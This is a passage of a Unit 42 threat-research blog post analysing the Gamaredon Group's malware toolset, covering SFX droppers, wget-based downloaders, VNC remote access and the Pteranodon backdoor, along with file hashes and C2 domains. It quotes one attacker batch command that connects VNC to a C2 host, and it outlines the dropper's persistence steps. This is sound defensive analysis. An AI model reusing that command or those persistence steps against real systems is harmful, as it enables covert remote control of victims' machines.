<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">The Gamaredon Group Toolset Evolution</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-24675 entry-meta">
			
			
			<span class="post-views-count">43,324</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'24675','like')"><i class="ui ui-2"></i><span class="ml-5">1</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 15</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit-42-title-gamaredon-group-toolset-evolution%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit-42-title-gamaredon-group-toolset-evolution%2F+-+The+Gamaredon+Group+Toolset+Evolution" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit-42-title-gamaredon-group-toolset-evolution%2F&title=The+Gamaredon+Group+Toolset+Evolution&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/anthony-kasza/" title="Posts by Anthony Kasza" class="author url fn" rel="author">Anthony Kasza</a> and <a href="https://unit42.paloaltonetworks.com/author/dominik-reichel/" title="Posts by Dominik Reichel" class="author url fn" rel="author">Dominik Reichel</a>        </p>
        <p><time datetime="2017-02-27T23:00:22+00:00">February 27, 2017 at 3:00 PM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/gamaredon/" rel="tag">Gamaredon</a>, <a href="https://unit42.paloaltonetworks.com/tag/malware/" rel="tag">malware</a>, <a href="https://unit42.paloaltonetworks.com/tag/threat-research/" rel="tag">threat research</a>, <a href="https://unit42.paloaltonetworks.com/tag/toolset/" rel="tag">Toolset</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit-42-title-gamaredon-group-toolset-evolution/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja"></span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>Unit 42 threat researchers have recently observed a threat group distributing new, custom developed malware. We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013.</p>
<p>In the past, the Gamaredon Group has relied heavily on off-the-shelf tools. Our new research shows the Gamaredon Group have made a shift to custom-developed malware. We believe this shift indicates the Gamaredon Group have improved their technical capabilities. The custom-developed malware is fully featured an includes these capabilities:</p>
<ul>
<li>A mechanism for downloading and executing additional payloads of their choice</li>
<li>The ability to scan system drives for specific file types</li>
<li>The ability to capture screenshots</li>
<li>The ability to remotely execute commands on the system in the users security context</li>
</ul>
<p>The Gamaredon Group primarily makes use of compromised domains, dynamic DNS providers, Russian and Ukrainian country code top-level domains (ccTLDs), and Russian hosting providers to distribute their custom-built malware.</p>
<p>Antimalware technologies have a poor record of detecting the malware this group has developed. We believe this is likely due to the modular nature of the malware, the malwares heavy use of batch scripts, and the abuse of legitimate applications and tools (such as wget) for malicious purposes.</p>
<p>Previously, <a href="https://www.lookingglasscyber.com/operation-armageddon-registration/">LookingGlass reported</a> on a campaign they named &#8220;Operation Armageddon,&#8221; targeting individuals involved in the Ukrainian military and national security establishment. Because we believe this group is behind that campaign, weve named them the Gamaredon Group, an anagram of Armageddon. At this time, it is unknown if the new payloads this group is distributing is a continuation of Operation Armageddon or a new campaign.</p>
<h3>Gamaredon: Historical Tool Analysis</h3>
<p>The earliest discovered sample (based on compile times and sandbox submission times) distributed by this threat group resembles the descriptions of Gamaredon provided by <a href="https://www.symantec.com/security_response/writeup.jsp?docid=2015-042917-4812-99&amp;tabid=2">Symantec</a> and <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_gamaredon.a">Trend Micro</a>. Unfortunately, this identification is rather tenuous, as it seems to only identify the first variant of payloads used by our threat actors. Some samples of later payload variants also have been given the generic and brittle names of <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_resetter.bb">TROJ_RESETTER.BB</a> and <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fraudrop.ex">TROJ_FRAUDROP.EX</a>.</p>
<p>Originally, the payloads delivered to targets by this threat group consisted of a password protected Self-extracting Zip-archive (.SFX) file which, when extracted, wrote a batch script to disk and installed a legitimate remote administration tool called tool <a href="https://rmansys.ru/remote-access/">Remote Manipulator System</a> (Figure 1) which they would abuse for malicious purposes.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_1.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24678" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_1.png" alt="gamaredon_1" width="610" height="560" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_1.png 610w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_1-300x275.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_1-370x340.png 370w" sizes="(max-width: 610px) 100vw, 610px" /></a></p>
<p><em>Figure 1 Remote Manipulator System Interface</em></p>
<p>One such self-extracting archive (ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc) was first observed around April of 2014. The password (reused by many of the password protected SFX payloads) it used to extract itself is 1234567890__. The files included in this SFX file we observed include a batch file named 123.cmd and another SFX named setting.exe. This second SFX contains a .MSI installer package which installs Remote Manipulator System and a batch script which handles the installation.</p>
<p>Later payloads would write batch scripts to disk as well as wget binaries. The batch scripts would use the wget binaries to download and execute additional executables. The scripts would also use wget to send POST requests to command and control (C2) servers that would contain information about the compromised system. Some of these payloads included decoy documents that would open when the malware is executed.</p>
<p>Three examples of this type of payload include:</p>
<ul>
<li>a6a44ee854c846f31d15b0ca2d6001fb0bdddc85f17e2e56abb2fa9373e8cfe7</li>
<li>b5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13</li>
<li>3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b</li>
</ul>
<p>We first observed these samples using wget in 2014. The filenames and decoy documents these samples used attempt to lure individuals by using the presidential administration of Ukraine, Ukrainian national security and defense, the Anti-Terrorist Operation Zone in the Ukraine, and Ukrainian patriotism as subjects. The text of one such decoy document is pictured below.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_2.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24681" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_2.png" alt="gamaredon_2" width="696" height="670" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_2.png 696w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_2-300x289.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_2-370x356.png 370w" sizes="(max-width: 696px) 100vw, 696px" /></a></p>
<p><em>Figure 2 Ukrainian Decoy Document used by Gamaredon Group</em></p>
<p>Other observed payloads would, again, use SFX files to deliver a batch script and an executable that allowed remote access through the VNC protocol. These VNC exectuables would either be included in the SFX file or downloaded by the batch script. We found one URL (now taken down) that hosted a VNC executable that the malware would attempt to download and install at hxxp://prestigeclub.frantov.com[.]ua/press-center/press/chrome-xvnc-v5517.exe.</p>
<p>The batch script would then attempt to have the VNC program connect to a command and control (C2) server to enable the server to control the compromised system. All VNC installations on compromised systems that we observed have used the same configuration file, RC4 key file, and passwords.</p>
<p>One such sample, cfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31 first appeared around January of 2015. The batch script utilized in this sample ensures a VNC connection is available:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f692876e9619675275559" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 start winlogons -autoreconnect -id:%sP% -connect grom56.ddns.net:5500</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f692876e9619675275559-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692876e9619675275559-1"><span class="crayon-h"> </span><span class="crayon-e">start </span><span class="crayon-v">winlogons</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">autoreconnect</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">id</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-v">sP</span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">connect </span><span class="crayon-v">grom56</span><span class="crayon-sy">.</span><span class="crayon-v">ddns</span><span class="crayon-sy">.</span><span class="crayon-v">net</span><span class="crayon-o">:</span><span class="crayon-cn">5500</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The path configured in the VNC configuration file across all implants employing VNC (UltraVNC.ini) is Y:\\ \ RMS\vnc. This isnt the only place hardcoded Cyrillic file paths are used by implants. Many of the batch scripts also use hardcoded paths such as  \\. Many payloads also include a VBS script which raises a dialog box to the users asking them to run the malware again. It reads,     (0xc0000005).    ? (English Translation from Russian: Application failed to initialize (0xc0000005). Try to open the file again?).</p>
<p>Some of the SFX files also include another legitimate application called <a href="http://mikelab.kiev.ua/index.php?page=PROGRAMS/chkflsh">ChkFlsh.exe</a> (8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845). This application was written by a Ukrainian programmer and is used to check performance of USB flash drives. Its value to the attackers to the attackers isnt clear but one possibility is that it is somehow used to steal or monitor files on USB devices. In our research, we found this application present in some SFX files along with VNC programs and in some SFX files that didnt have VNC programs included.</p>
<h3>Custom Implants</h3>
<p>While the most recent samples observed still use batch scripts and SFX files, the Gamaredon Group has moved away from applications like wget, Remote Manipulator Tool, VNC and ChkFlsh.exe. Instead of using wget the attackers are distributing custom developed downloaders, and instead of Remote Manipulator or VNC the malware is using a custom developed remote access implant.</p>
<p>In June of 2015 a custom downloader used by many newer samples was first seen in the wild and is often included in SFX implants with the name LocalSMS.dll. This downloader makes requests to adobe.update-service[.]net (hardcoded in the sample) and is further discussed in Appendix A.</p>
<p>In February 2016, another custom tool now often included in SFX implants was seen in the wild. This SFX file (3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9) contains a new Trojan (598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824) we refer to as Pteranodon. Pteranodon is a custom backdoor which is capable of the following tasks:</p>
<ul>
<li>Capturing screenshots at a configurable interval and uploading them to the attacker</li>
<li>Downloading and executing additional files</li>
<li>Executing arbitrary commands on the system</li>
</ul>
<p>The earliest version of Pteranodon uses a hardcoded URL for command and control. It sends POST requests to msrestore[.]ru/post.php using a static multipart boundary:</p>
<p style="padding-left: 30px;">&#8212;&#8212;&#8212;&#8212;870978B0uNd4Ry_$</p>
<p>Newer versions of the tool also use hardcoded domains and multipart boundaries. They also share similar pdb strings. Other Pteranodon samples can be found in AutoFocus using the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Pteranodon">Pteranodon</a> tag. The most recent variant of Pteranodon is analyzed in Appendix A.</p>
<p>We have only identified one delivery vector for the new implants thus far. A Javascript file (f2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd) first seen in December of 2016 downloads a resource from http://samotsvety.com[.]ua/files/index.pht (likely a compromised site used for staging payloads) which previously an SFX file (b2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875) containing two of the Gamaredon custom tools.</p>
<p>A related sample (e24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4) used the same distinct Mutex and contains a larger set of tools for analysis. The original name of the file is &#8220;AdapterTroubleshooter.exe&#8221; and the file uses icons which resemble those used by OpenVPN, as seen below.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_3.png" rel="wpdevart_lightbox"><img class="size-full wp-image-24684 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_3.png" alt="gamaredon_3" width="202" height="156" /></a></p>
<p>Upon examining the sample&#8217;s file activity within AutoFocus it is clear the sample is a self-extracting executable.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-24687" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4.png" alt="gamaredon_4" width="974" height="174" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4-900x161.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4-300x54.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4-768x137.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4-370x66.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></a></p>
<p><em>Figure 3 Self Extracting executable behavior shown in AutoFocus</em></p>
<p>Opening the sample with 7zip inside of a virtual machine, all the files contents can be examined. Below is a table providing the SHA256 values, the filenames, the compile timestamps and the pdb paths of the contents of the SFX file.</p>
<table width="100%">
<tbody>
<tr>
<td width="184"><strong>SHA256</strong></td>
<td width="99"><strong>Filename</strong></td>
<td width="63"><strong>Compile Time</strong></td>
<td width="121"><strong>PDB Path</strong></td>
</tr>
<tr>
<td width="184">400f53a89d08d47f608e1288d9873bf8d421fc7cd642c5e821674f38e07a1501</td>
<td width="99">LocalSMS.dll</td>
<td width="63">Wed Apr 29 08:10:30 2015</td>
<td width="121">c:\users\viber\documents\visual studio 2013\projects\contextmenu\release\contextmenu.pdb</td>
</tr>
<tr>
<td width="184">d01df47b6187631c9a93bdad1298439ab1a1c5529b3319f3614b6ec2455e5726</td>
<td width="99">MpClients.dll</td>
<td width="63">Thu Sep 08 05:01:00 2016</td>
<td width="121">c:\users\user\documents\visual studio 2015\projects\updaterv1\release\updaterv1.pdb</td>
</tr>
<tr>
<td width="184">f2296bcb6be68dfb330baec2091fb11a42a51928ba057164213580e6ff0e1126</td>
<td width="99">OfficeUpdate.dll</td>
<td width="63">Wed Dec 07 09:25:57 2016</td>
<td width="121">&#8211;</td>
</tr>
<tr>
<td width="184">2ded2f3b5b5b6155ce818893c67887cbfa8b539be6c983e314ccf2177552da20</td>
<td width="99">SmartArtGraphicsLog.lnk</td>
<td width="63">&#8211;</td>
<td width="121">&#8211;</td>
</tr>
<tr>
<td width="184">46a39da996b01e26ddd71d51c9704de2aa641cd3443f6fe0e5c485f1cd9fa65d</td>
<td width="99">UsrClass.lnk</td>
<td width="63">&#8211;</td>
<td width="121">&#8211;</td>
</tr>
<tr>
<td width="184">a972ad0ddc00d5c04d9fe26f1748e12008efdd6524c9d2ea4e6c2d3e42d82b7b</td>
<td width="99">condirs.cmd</td>
<td width="63">&#8211;</td>
<td width="121">&#8211;</td>
</tr>
<tr>
<td width="184">37c78ee7826d63bb9219de594ed6693f18da5db60e3cbc86795bd10b296f12ac</td>
<td width="99">winrestore.dll</td>
<td width="63">Mon Jan 09 03:12:39 2017</td>
<td width="121">c:\develop\ready\winrestore &#8211; proxy\release\winrestore.pdb</td>
</tr>
<tr>
<td width="184">90ba0f95896736b799f8651ef0600d4fa85c6c3e056e54eab5bb216327912edd</td>
<td width="99">wmphost.exe</td>
<td width="63">Thu Dec 01 08:23:32 2016</td>
<td width="121">c:\develop\ready\mouse-move\mouse-move\release\mouse-move.pdb</td>
</tr>
</tbody>
</table>
<p>The bootstrapping logic for the sample relies on the contents of &#8220;condirs.cmd&#8221;. Briefly, the logic within &#8220;condirs.cmd&#8221; follows:</p>
<p>1. Ensure &#8220;%LOCALAPPDATA%\Microsoft\Windows\&#8221; exists<br />
2. Kill and delete processes, files, and scheduled tasks which may interfere with the sample executing<br />
3. Copy &#8220;winrestore.dll&#8221; to &#8220;%LOCALAPPDATA%\Microsoft\Windows\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll&#8221;<br />
4. Copy &#8220;OfficeUpdate.dll&#8221; to &#8220;%LOCALAPPDATA%\Microsoft\Windows\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll&#8221;<br />
5. Determine if the operating system is Windows XP or Windows 7<br />
6. If the system is running Windows XP</p>
<p style="padding-left: 60px;">a. Set the directory to copy files into as &#8220;%WINDIR%\Setup\State\Office&#8221;<br />
b. Copy &#8220;UsrClass.lnk&#8221; to &#8220;%USERPROFILE%\ \\\&#8221;<br />
c. Copy &#8220;SmartArtGraphicsLog.lnk&#8221; to &#8220;%USERPROFILE%\ \\\&#8221;</p>
<p>7. If the system is running Windows 7</p>
<p style="padding-left: 60px;">a. Set the directory to copy files into as &#8220;%APPDATA%\Microsoft\Office&#8221;<br />
b. Copy &#8220;UsrClass.lnk&#8221; to &#8220;%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\&#8221;<br />
